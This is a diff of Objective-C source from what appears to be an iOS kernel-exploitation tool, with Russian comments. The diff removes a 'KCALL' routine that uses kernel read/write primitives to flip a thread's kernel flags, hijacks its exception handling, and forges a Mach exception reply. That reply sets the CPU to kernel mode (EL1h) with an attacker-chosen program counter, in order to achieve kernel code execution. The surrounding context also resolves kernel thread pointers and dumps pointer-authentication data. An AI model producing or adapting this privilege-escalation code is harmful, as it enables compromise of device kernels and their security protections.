@@ -2367,7 +2367,6 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                          ? kp_untag_ptr(kpSMRDecode(tbT)) : kp_untag_ptr(tbT);
                             kpNote(r, [NSString stringWithFormat:@"  [BOOT] isTable=%#llx", (unsigned long long)isT]);
                             uint64_t thK = 0;
-                            mach_port_t savedThPort = MACH_PORT_NULL;
                             if (isT && tkr == KERN_SUCCESS && threads && tcount > 0) {
                                 // берём первый thread-порт и резолвим через isTable
                                 mach_port_t tp = threads[0];
@@ -2397,8 +2396,6 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                         if (thK) break;
                                     }
                                 }
-                                // сохраняем порт ДО deallocate
-                                if (tcount > 0 && threads) savedThPort = threads[0];
                                 for (mach_msg_type_number_t i = 0; i < tcount; i++)
                                     mach_port_deallocate(mach_task_self(), threads[i]);
                                 vm_deallocate(mach_task_self(), (vm_address_t)threads, tcount * sizeof(mach_port_t));
@@ -2423,99 +2420,6 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                     }
                                 }
                                 kpNote(r, [NSString stringWithFormat:@"  [BOOT] offsets:%@", found]);
-                            }
-                            // ---- KCALL 2.0.113: точные MIG-раскладки из mach_exc.h ----
-                            // Request (2406): Head@0 NDR@18 exc@20 codeCnt@24 code@28 flavor@38 oldCnt@3c state@40
-                            // Reply   (2506): Head@0 NDR@18 Ret@20 flavor@24 newCnt@28 state@2c
-                            // natural_t state: x[29]*2, fp*2, lr*2, sp*2, pc*2, cpsr, pad = 68 u32
-                            // pc@state+64*4=0x100, lr@0xf0, sp@0xf8, cpsr@0x108
-                            {
-                                NSString *kfPath2 = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kcall.txt"];
-                                NSString *pre = [NSString stringWithFormat:@"pre-check thK=%#llx tkr=%d threads=%p tcount=%u\n", (unsigned long long)thK, tkr, threads, tcount];
-                                [pre writeToFile:kfPath2 atomically:YES encoding:NSUTF8StringEncoding error:nil];
-                                kpNote(r, [NSString stringWithFormat:@"  [KCALL] pre-check thK=%#llx tkr=%d tcount=%u", (unsigned long long)thK, tkr, tcount]);
-                            }
-                            if (thK && tkr == KERN_SUCCESS && threads && tcount > 1) {
-                                // файловый лог — переживает crash
-                                NSString *kfPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kcall.txt"];
-                                [@"=== KCALL START ===\n" writeToFile:kfPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
-                                                                // используем thK из BOOT (УЖЕ валидирован через tro→task)
-                                mach_port_t hp = MACH_PORT_NULL;
-                                uint64_t hK = thK;   // берём готовый thread*
-                                // порт: threads[0] (первый из task_threads)
-                                hp = savedThPort;
-                                { NSString *s = [NSString stringWithFormat:@"use BOOT thK=%#llx port=0x%x\n", (unsigned long long)hK, hp]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfPath]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[s dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] %@", s]); }
-                                // hK = thK из BOOT, hp = threads[0]. НЕ перезаписываем hp!
-                                { NSString *s = [NSString stringWithFormat:@"helper port=0x%x thread*=%#llx nports=%u\n", hp, (unsigned long long)hK, tcount]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfPath]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[s dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] %@", s]); }
-                                if (hK) {
-                                    uint64_t kstack = kp_untag_ptr(early_kread64(hK + 0xe8));
-                                    // 2.0.131: spin не нужен — PC=kstack (нули → udf → exception). Проверяем pipeline.
-                                    uint64_t spin = kstack + 0x100;
-                                    { NSString *s = [NSString stringWithFormat:@"use PC=kstack+0x100=%#llx (udf fault → exception test)\n", (unsigned long long)spin]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfPath]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[s dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] %@", s]); }
-                                    { NSString *s = [NSString stringWithFormat:@"kstack=%#llx spin=%#llx\n", (unsigned long long)kstack, (unsigned long long)spin]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfPath]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[s dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] %@", s]); }
-                                    mach_port_t excport = MACH_PORT_NULL;
-                                    mach_port_options_t popts = { .flags = MPO_INSERT_SEND_RIGHT | 0x8000, .mpl = { .mpl_qlimit = 5 } };
-                                    kern_return_t ekr = mach_port_construct(mach_task_self(), &popts, 0, &excport);
-                                    { NSString *s = [NSString stringWithFormat:@"excport kr=0x%x\n", ekr]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfPath]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[s dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] %@", s]); }
-                                    if (ekr == KERN_SUCCESS && excport && spin && kstack) {
-                                        // EXCEPTION_STATE + проверка kr
-                                        kern_return_t epr = thread_set_exception_ports(hp, EXC_MASK_ALL, excport, EXCEPTION_STATE, ARM_THREAD_STATE64);
-                                        { NSString *s = [NSString stringWithFormat:@"set_exc_ports kr=0x%x\n", epr]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfPath]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[s dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] %@", s]); }
-                                        if (epr != KERN_SUCCESS) {
-                                            // fallback: task-level
-                                            epr = task_set_exception_ports(mach_task_self(), EXC_MASK_ALL, excport, EXCEPTION_STATE, ARM_THREAD_STATE64);
-                                            kpNote(r, [NSString stringWithFormat:@"  [KCALL] task_set_exc_ports kr=0x%x", epr]);
-                                        }
-                                        if (epr != KERN_SUCCESS) {
-                                            kpNote(r, @"  [KCALL] exception port FAIL — skip resume");
-                                            mach_port_deallocate(mach_task_self(), excport);
-                                        } else {
-                                        uint64_t oVA = hK + 0xC0;
-                                        uint64_t o0 = early_kread64(oVA);
-                                        early_kwrite64(oVA, o0 | 0x8000ULL);
-                                        // FAKE_PC через thread_set_state
-                                        arm_thread_state64_t st;
-                                        memset(&st, 0, sizeof(st));
-                                        st.__opaque_pc = (void *)(uintptr_t)0x301;
-                                        st.__opaque_lr = (void *)(uintptr_t)0x401;
-                                        kern_return_t ssr = thread_set_state(hp, ARM_THREAD_STATE64, (thread_state_t)&st, ARM_THREAD_STATE64_COUNT);
-                                        { NSString *s = [NSString stringWithFormat:@"set_state FAKE_PC kr=0x%x resume\n", ssr]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfPath]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[s dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] %@", s]); }
-                                        // 2.0.133: НЕ resume — изолируем зависание
-                                        { NSString *ss = @"no-resume test\n"; NSFileHandle *fh2 = [NSFileHandle fileHandleForWritingAtPath:kfPath]; if (fh2) { [fh2 seekToEndOfFile]; [fh2 writeData:[ss dataUsingEncoding:NSUTF8StringEncoding]]; [fh2 closeFile]; } kpNote(r, @"  [KCALL] no-resume test"); }
-                                        // Request: 2406, до 0x40+68*4 = 0x150 байт достаточно
-                                        uint8_t req[0x200]; memset(req, 0, sizeof(req));
-                                        mach_msg_header_t *rh = (mach_msg_header_t *)req;
-                                        kern_return_t wkr = mach_msg(rh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 0x200, excport, 500, MACH_PORT_NULL);
-                                        { NSString *s = [NSString stringWithFormat:@"recv kr=0x%x id=%u size=%u\n", wkr, rh->msgh_id, rh->msgh_size]; NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:kfPath]; if (fh) { [fh seekToEndOfFile]; [fh writeData:[s dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; } kpNote(r, [NSString stringWithFormat:@"  [KCALL] %@", s]); }
-                                        if (wkr == KERN_SUCCESS && rh->msgh_id == 2406) {
-                                            // Reply 2506
-                                            uint8_t rep[0x200]; memset(rep, 0, sizeof(rep));
-                                            *(uint32_t *)(rep + 0x00) = MACH_MSGH_BITS(MACH_MSG_TYPE_MOVE_SEND_ONCE, 0);
-                                            *(uint32_t *)(rep + 0x04) = 0x13c;
-                                            *(uint32_t *)(rep + 0x08) = rh->msgh_remote_port;
-                                            *(uint32_t *)(rep + 0x0c) = 0;
-                                            *(uint32_t *)(rep + 0x10) = 2506;   // id = 2406+100
-                                            *(uint32_t *)(rep + 0x20) = 0;      // RetCode
-                                            *(uint32_t *)(rep + 0x24) = ARM_THREAD_STATE64; // flavor
-                                            *(uint32_t *)(rep + 0x28) = 68;     // new_stateCnt
-                                            // new_state @0x2c
-                                            // __sp @ 0x2c+0xf8, __lr @ 0x2c+0xf0, __pc @ 0x2c+0x100, cpsr @ 0x2c+0x108
-                                            *(uint64_t *)(rep + 0x2c + 0xf0) = spin;             // lr
-                                            *(uint64_t *)(rep + 0x2c + 0xf8) = kstack + 0x3000;  // sp
-                                            *(uint64_t *)(rep + 0x2c + 0x100) = spin;            // pc
-                                            *(uint32_t *)(rep + 0x2c + 0x108) = 0x3c5;           // cpsr = EL1h
-                                            kern_return_t s2 = mach_msg((mach_msg_header_t *)rep, MACH_SEND_MSG, 0x13c, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
-                                            kpNote(r, [NSString stringWithFormat:@"  [KCALL] reply kr=0x%x (EL1h pc=spin)", s2]);
-                                            kpNote(r, @"  [KCALL] reply sent — terminate now");
-                                        } else {
-                                            kpNote(r, @"  [KCALL] не raise_state (id!=2406) — пропуск");
-                                        }
-                                        early_kwrite64(oVA, o0);
-                                        thread_terminate(hp);
-                                        mach_port_deallocate(mach_task_self(), excport);
-                                        }
-                                    }
-                                }
                             }
                                                     }
                         // 2.0.97: дамп thread* 0x00..0x200 — ищем kstack/PAC по контенту
